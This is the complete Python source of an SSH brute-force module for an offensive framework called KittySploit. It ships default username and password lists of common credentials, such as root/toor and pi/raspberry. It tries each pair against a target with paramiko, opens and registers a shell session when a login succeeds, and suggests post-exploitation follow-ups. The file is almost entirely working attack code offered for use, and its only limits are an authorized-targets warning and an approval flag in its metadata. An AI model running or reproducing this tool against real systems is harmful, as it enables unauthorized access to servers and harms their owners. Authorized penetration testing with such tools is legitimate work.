#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SSH login bruteforce — tests username/password pairs and opens an SSH session.
"""

from __future__ import annotations

import itertools
import os
import time
from typing import Any, List, Optional, Tuple

from kittysploit import *
from core.framework.base_module import ModuleResult
from lib.protocols.tcp.tcp_scanner_client import Tcp_scanner_client
from lib.scanner.ssh.detectors import probe_ssh_auth_methods, probe_ssh_banner

# Generic soft-target spray — not a lab cheat sheet. Order is common-first.
DEFAULT_SSH_USERS = [
    "root",
    "admin",
    "user",
    "ubuntu",
    "pi",
    "raspberry",
    "msfadmin",
    "test",
    "guest",
    "oracle",
    "ftp",
    "vagrant",
]
DEFAULT_SSH_PASSWORDS = [
    "",
    "root",
    "toor",
    "admin",
    "password",
    "password123",
    "123456",
    "1234",
    "raspberry",
    "pi",
    "msfadmin",
    "user",
    "ubuntu",
    "test",
    "guest",
    "changeme",
    "pass",
    "passw0rd",
    "default",
    "vagrant",
]

_PASSWORD_AUTH_HINTS = frozenset(
    {
        "password",
        "keyboard-interactive",
        "keyboard_interactive",
        "passwd",
    }
)


class Module(Auxiliary, Tcp_scanner_client):
    __info__ = {
        "name": "SSH login bruteforce",
        "description": (
            "Attempts common and wordlist-based SSH password credentials. "
            "Prefer running after scanner/ssh/ssh_auth_methods when password "
            "or keyboard-interactive auth is offered. Registers an SSH session "
            "on success. Authorized targets only."
        ),
        "author": "KittySploit Team",
        "tags": ["ssh", "linux", "credentials", "bruteforce", "scanner", "session"],
        "agent": {
            "risk": "intrusive",
            "effects": ["credential_spray", "network_probe"],
            "expected_requests": 40,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "risk_signals"],
            "chain": {
                "consumes_capabilities": ["service_identified", "ssh_auth_surface"],
                "produces_capabilities": [
                    {"capability": "ssh_access", "from_detail": "username"},
                    "authenticated_session",
                    "shell",
                ],
                "option_bindings": {},
                "suggested_followups": [
                    "post/shell/linux/gather/enum_system",
                    "post/shell/linux/gather/check_sudo",
                ],
            },
        },
    }

    port = OptPort(22, "SSH port", True)
    username = OptString("", "Single username to try", False)
    password = OptString("", "Single password to try", False)
    usernames_file = OptFile("", "File with usernames (one per line)", False)
    passwords_file = OptFile("", "File with passwords (one per line)", False)
    delay = OptFloat(0.2, "Delay between attempts in seconds", False)
    max_attempts = OptInteger(80, "Maximum credential pairs to try (0 = unlimited)", False)
    stop_on_success = OptBool(True, "Stop after the first valid credential pair", False)
    create_session = OptBool(True, "Register an SSH session on successful login", False)
    require_password_auth = OptBool(
        False,
        "Abort when auth method probe shows no password/keyboard-interactive",
        False,
    )

    def _opt(self, name: str, default: Any = "") -> Any:
        value = getattr(self, name, default)
        if hasattr(value, "value"):
            return value.value
        return value

    def _read_wordlist(self, path: str) -> List[str]:
        if not path or not os.path.isfile(path):
            if path:
                print_warning(f"Wordlist not found: {path}")
            return []
        values: List[str] = []
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as handle:
                for line in handle:
                    item = line.strip()
                    if item and not item.startswith("#"):
                        values.append(item)
        except OSError as exc:
            print_warning(f"Unable to read wordlist {path}: {exc}")
        return values

    def _build_candidates(self) -> List[Tuple[str, str]]:
        users: List[str] = []
        passwords: List[str] = []

        single_user = str(self._opt("username", "") or "").strip()
        single_pass = str(self._opt("password", "") or "")
        users_file = str(self._opt("usernames_file", "") or "").strip()
        passes_file = str(self._opt("passwords_file", "") or "").strip()

        if single_user:
            return [(single_user, single_pass)]

        if users_file:
            users = self._read_wordlist(users_file)
        if passes_file:
            passwords = self._read_wordlist(passes_file)

        if not users:
            users = list(DEFAULT_SSH_USERS)
        if not passwords:
            passwords = list(DEFAULT_SSH_PASSWORDS)

        # Prioritize natural "same as username" / empty passwords before the
        # full cartesian product so soft targets are found without needing
        # lab-specific single-pair injection.
        pairs: List[Tuple[str, str]] = []
        seen: set = set()

        def _add(user: str, password: str) -> None:
            key = (user, password)
            if key in seen:
                return
            seen.add(key)
            pairs.append(key)

        for user in users:
            _add(user, user)
            _add(user, "")
        for user, password in itertools.product(users, passwords):
            _add(user, password)

        max_attempts = int(self._opt("max_attempts", 80) or 0)
        if max_attempts > 0:
            pairs = pairs[:max_attempts]
        return pairs

    @staticmethod
    def _offers_password_auth(methods: List[str]) -> bool:
        lowered = {str(m).lower().strip() for m in methods}
        return bool(lowered & _PASSWORD_AUTH_HINTS)

    def _connect(self, host: str, username: str, password: str):
        try:
            import paramiko
        except ImportError:
            print_error("paramiko is required for SSH login bruteforce")
            return None
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                host,
                port=int(self._port()),
                username=username,
                password=password,
                timeout=max(float(self._timeout()), 5.0),
                allow_agent=False,
                look_for_keys=False,
            )
            return client
        except Exception:
            try:
                client.close()
            except Exception:
                pass
            return None

    def _register_session(
        self,
        host: str,
        client: Any,
        username: str,
        password: str,
    ) -> Optional[str]:
        if not bool(self._opt("create_session", True)):
            try:
                client.close()
            except Exception:
                pass
            return None
        if not self.framework or not hasattr(self.framework, "session_manager"):
            print_warning("Framework session manager unavailable — connection not registered")
            try:
                client.close()
            except Exception:
                pass
            return None
        session_data = {
            "host": host,
            "port": self._port(),
            "username": username,
            "password": password,
            "client": client,
            "platform": "linux",
        }
        session_id = self.framework.session_manager.create_session(
            host=host,
            port=int(self._port()),
            session_type=SessionType.SSH.value,
            data=session_data,
        )
        print_success(f"SSH session registered: {session_id}")
        return session_id

    def check(self):
        host = self._host()
        port = self._port()
        if not host:
            return {"vulnerable": False, "reason": "target not set", "confidence": "low"}
        if not self.is_tcp_open(host=host, port=port):
            return {
                "vulnerable": False,
                "reason": f"TCP port {port} closed on {host}",
                "confidence": "high",
            }
        probe_user = str(self._opt("username", "") or "").strip() or "root"
        auth = probe_ssh_auth_methods(
            host=host,
            port=port,
            timeout=min(float(self._timeout()), 8.0),
            username=probe_user,
        )
        methods = [str(m) for m in (auth.get("methods") or [])]
        if auth.get("detected") and methods:
            if self._offers_password_auth(methods):
                return {
                    "vulnerable": True,
                    "reason": (
                        f"SSH password auth offered for {probe_user}: "
                        f"{', '.join(methods)}"
                    ),
                    "confidence": "medium",
                    "methods": methods,
                }
            return {
                "vulnerable": False,
                "reason": (
                    f"SSH reachable but no password auth for {probe_user} "
                    f"(methods: {', '.join(methods)})"
                ),
                "confidence": "medium",
                "methods": methods,
            }
        info = probe_ssh_banner(host=host, port=port, timeout=min(float(self._timeout()), 5.0))
        if info.get("detected"):
            product = info.get("product") or "ssh"
            version = info.get("version") or ""
            return {
                "vulnerable": True,
                "reason": f"SSH service reachable ({product} {version})".strip(),
                "confidence": "low",
            }
        return {
            "vulnerable": True,
            "reason": f"TCP port {port} open — SSH banner inconclusive",
            "confidence": "low",
        }

    def run(self):
        host = self._host()
        if not host:
            print_warning("Target is required")
            return False
        if not self.is_tcp_open(host=host, port=self._port()):
            print_error(f"TCP port {self._port()} is not open on {host}")
            return False

        probe_user = str(self._opt("username", "") or "").strip() or "root"
        auth = probe_ssh_auth_methods(
            host=host,
            port=int(self._port()),
            timeout=max(float(self._timeout()), 8.0),
            username=probe_user,
        )
        methods = [str(m) for m in (auth.get("methods") or [])]
        if methods:
            print_status(f"SSH auth methods for {probe_user}: {', '.join(methods)}")
            if not self._offers_password_auth(methods):
                msg = (
                    f"No password/keyboard-interactive auth offered "
                    f"(methods: {', '.join(methods)})"
                )
                if bool(self._opt("require_password_auth", False)):
                    print_warning(msg + " — aborting")
                    return False
                print_warning(msg + " — continuing anyway")

        print_warning("Only run against authorized SSH targets")
        candidates = self._build_candidates()
        delay = max(float(self._opt("delay", 0.2) or 0.0), 0.0)
        stop_on_success = bool(self._opt("stop_on_success", True))

        print_status(
            f"Trying up to {len(candidates)} credential pair(s) on "
            f"{host}:{self._port()} (delay={delay}s)..."
        )

        found: List[dict] = []
        for index, (user, pwd) in enumerate(candidates, start=1):
            label = f"{user}:{pwd if pwd else '(empty)'}"
            print_status(f"[{index}/{len(candidates)}] Trying {label}")
            client = self._connect(host, user, pwd)
            if client is None:
                if delay > 0 and index < len(candidates):
                    time.sleep(delay)
                continue

            print_success(f"Valid SSH credentials: {user}:{pwd if pwd else '(empty)'}")
            session_id = self._register_session(host, client, user, pwd)
            entry = {
                "username": user,
                "password": pwd,
                "host": host,
                "port": self._port(),
                "session_id": session_id,
            }
            found.append(entry)
            self.vulnerability_info = {
                "reason": (
                    f"SSH login succeeded for {user} "
                    f"(password={pwd if pwd else '(empty)'})"
                ),
                "severity": "High",
                "username": user,
                "password": pwd,
                "host": host,
                "port": self._port(),
                "authenticated_as": user,
                "methods": methods,
                "proof": f"ssh_auth:{user}@{host}:{self._port()}",
            }
            if session_id:
                self.vulnerability_info["session_id"] = session_id

            if stop_on_success:
                if session_id:
                    return ModuleResult(
                        success=True,
                        session_id=session_id,
                        data=entry,
                        evidence={
                            "kind": "credential",
                            "summary": f"SSH login succeeded for {user}",
                            "authenticated_as": user,
                            "session_id": session_id,
                            "methods": methods,
                        },
                    )
                return True
            if delay > 0:
                time.sleep(delay)

        if found:
            last = found[-1]
            print_success(f"Found {len(found)} valid credential pair(s)")
            if last.get("session_id"):
                return ModuleResult(success=True, session_id=last["session_id"], data=last)
            return True

        print_info("No valid SSH credentials matched")
        return False
